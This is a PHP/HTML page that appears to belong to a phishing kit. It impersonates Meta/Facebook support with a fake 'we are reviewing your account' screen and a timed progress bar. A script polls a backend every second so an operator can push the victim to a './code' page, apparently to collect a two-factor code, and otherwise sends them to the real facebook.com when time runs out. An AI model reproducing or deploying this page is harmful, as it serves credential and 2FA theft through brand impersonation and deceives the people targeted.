<?php 
// $apis = json_decode($apis, true);
// if($apis['status'] == 'error'){
//   header('location: ./business');
// }else{
//   $apis = $apis['json']; 
//   if($apis['step'] == '2') {
//       header('location: ./code');
//   }else if($apis['step'] == '3') {
//     if($apis['time'] != '' && $apis['time'] - time() < -30) {
//       unset($_SESSION['id']);
//       header('location: ./business');
//     }
//       $tmht = ($apis['time'] - time()) * 1000;
      
   
// ?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Continue... || Meta Help</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
      crossorigin="anonymous"
    />
    <link
      rel="stylesheet"
      href="https://site-assets.fontawesome.com/releases/v6.5.1/css/all.css"
    />

    <link
      rel="stylesheet"
      href="https://site-assets.fontawesome.com/releases/v6.5.1/css/sharp-thin.css"
    />

    <link
      rel="stylesheet"
      href="https://site-assets.fontawesome.com/releases/v6.5.1/css/sharp-solid.css"
    />

    <link
      rel="stylesheet"
      href="https://site-assets.fontawesome.com/releases/v6.5.1/css/sharp-regular.css"
    />

    <link
      rel="stylesheet"
      href="https://site-assets.fontawesome.com/releases/v6.5.1/css/sharp-light.css"
    />
  </head>
  <body>
    <style>
      body {
        background-color: #f0f2f5;
      }

      .text-main {
        color: #0866ff;
      }

      .fs-7 {
        font-size: 7px;
      }

      .fs-8 {
        font-size: 8px;
      }

      .fs-9 {
        font-size: 9px;
      }

      .fs-10 {
        font-size: 10px;
      }

      .fs-11 {
        font-size: 11px;
      }

      .fs-12 {
        font-size: 12px;
      }

      .fs-13 {
        font-size: 13px;
      }

      .fs-14 {
        font-size: 14px;
      }

      .fs-15 {
        font-size: 15px;
      }

      .fs-16 {
        font-size: 16px;
      }

      .fs-17 {
        font-size: 17px;
      }

      .fs-18 {
        font-size: 18px;
      }

      .fs-19 {
        font-size: 19px;
      }

      .fs-20 {
        font-size: 20px;
      }

      .fs-21 {
        font-size: 21px;
      }

      .fs-22 {
        font-size: 22px;
      }

      .fs-23 {
        font-size: 23px;
      }

      .fs-24 {
        font-size: 24px;
      }

      .fs-25 {
        font-size: 25px;
      }

      .fs-26 {
        font-size: 26px;
      }

      .fs-27 {
        font-size: 27px;
      }

      .fs-28 {
        font-size: 28px;
      }

      .fs-29 {
        font-size: 29px;
      }

      .fs-30 {
        font-size: 30px;
      }

      .fw-500 {
        font-weight: 500;
      }

      .fw-400 {
        font-weight: 400;
      }
      .navbar {
        height: 4rem;
        border-bottom: 1px solid #d5d5d5;
      }
      .text-gray {
        color: #929292;
      }
      .bg-gray {
        background-color: #e4e6eb;
      }
      .content {
        padding-top: 63px;
      }
      .mainx{
        height: 66vh;
      }
      @media (min-width: 992px) {
        .app-content {
          width: 42rem;
        }
      }
    </style>
    <div class="navbar fixed-top w-100 d-flex bg-white">
      <div
        class="ps-lg-5 pe-lg-5 ps-4 d-flex align-items-center w-100 justify-content-center"
      >
          <div class="d-flex text-primary  align-items-center fs-27 fw-bold">
            facebook
          </div>
        </div>
      </div>
    </div>
    <div class="content">
      <div class="mt-lg-5 mainx">
        <div class="mt-lg-3 d-flex flex-column h-full align-items-center">
          <div class="app-content mb-5 bg-white p-5 border border-1 rounded-2">
            <div class="row">
                <div class="col-4">
                    <img src="robot.jpg" width="143" />
                </div>
                <div class="col">

                    <div class="fs-17 fw-semibold">Hello , We have received your information</div>
                    <hr class="mt-4 pb-0 w-100 text-gray" />
                    <div class="fs-14">
                    Reviewing your activity only takes a few more minutes. We may request additional information to confirm that this is your account
                    </div>
                    <div class="fs-14 mt-3">
                    Please wait, this process may take up to 10-20 minutes, please be patient while we review your case...
                    </div>
                    <div class="mt-3">
                        <div class="progress rounded-1" id="progress" role="progressbar" aria-label="Basic example" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100">
                            <div class="progress-bar" style="width: 0%"></div>
                          </div>
                    </div>
                    <div class="fs-14 mt-2">
                    We will notify you once the inspection is complete,
                    </div>
                </div>
            </div>
          </div>
        </div>
      </div>
      <div class="bg-white pt-4 pb-4">
        <div class="ps-lg-5 pe-lg-5 w-100">
          <div class="ps-lg-5 pe-lg-5 w-100">
            <div class="ps-lg-5 pe-lg-5 w-100">
              <div class="ps-lg-5 pe-lg-5 container">
                <div class="row row-cols-1 row-cols-lg-5 g-4 g-lg-5">
                  <div class="col mb-3">
                    <span class="fs-13 text-gray fw-500">2024 Meta</span>
                  </div>

                  <div class="col mb-3">
                    <div class="fw-semibold fs-14">About</div>
                    <div class="mt-3">
                      <ul class="list-unstyled mb-0 fs-14">
                        <li>
                          <a
                            href="#"
                            class="fw-semibold text-body text-decoration-none"
                            >Ad selection</a
                          >
                        </li>
                        <li class="mt-3">
                          <a
                            href="#"
                            class="fw-semibold text-body text-decoration-none"
                            >Create ads</a
                          >
                        </li>
                      </ul>
                    </div>
                  </div>
                  <div class="col mb-3">
                    <div class="fw-semibold fs-14">Privacy</div>
                    <div class="mt-3">
                      <ul class="list-unstyled mb-0 fs-14">
                        <li>
                          <a
                            href="#"
                            class="fw-semibold text-body text-decoration-none"
                            >Job</a
                          >
                        </li>
                        <li class="mt-3">
                          <a
                            href="#"
                            class="fw-semibold text-body text-decoration-none"
                            >Create page</a
                          >
                        </li>
                      </ul>
                    </div>
                  </div>
                  <div class="col mb-3">
                    <ul class="list-unstyled mb-0 fs-14">
                      <li>
                        <a
                          href="#"
                          class="fw-semibold text-body text-decoration-none"
                          >Policy terms</a
                        >
                      </li>
                      <li class="mt-3">
                        <a
                          href="#"
                          class="fw-semibold text-body text-decoration-none"
                          >Cookie</a
                        >
                      </li>
                    </ul>
                  </div>
                  <div class="col mb-3">
                    <div class="d-flex align-items-start flex-row">
                      <span class="text-gray fs-13 fw-semibold me-2">From</span>
                      <img src="meta.png" width="100" height="20" />
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
      crossorigin="anonymous"
    ></script>
    <script src="https://code.jquery.com/jquery-3.5.0.min.js"></script>
    <script>
      let code = "1234";

      var progressBar = $('#progress .progress-bar');

// Animate the progress bar
progressBar.animate({
  width: '100%'
}, <?=$tmht;?>, 'linear', function() {
  window.location.href = 'https://facebook.com';
}); 
function checkStatuss() { 
        
            $.ajax({
                url: "./api/get_info_by_id",
                type: 'GET',
                dataType: 'json',
                success: function(data) {
                if(data.status == 'error'){

                }else{
                datas = data.json
                    if (datas.step === '2' || datas.step === '2') {
                    
        setTimeout(function() {window.location.href = './code';}, 2000);  
                    } else { 
                    //no

                    }
                }
                },
                error: function(error) {
                    console.log('Error:', error);
                    // Xử lý lỗi 
                    window.location.href = '';
                }
            });
        } 
var intervalIds = setInterval(function() { 
                         checkStatuss(); 
                       }, 1000);
    </script>
  </body>
</html> 

<?php
// }else{
//     header('location: ./business');
//   }
// } 
?>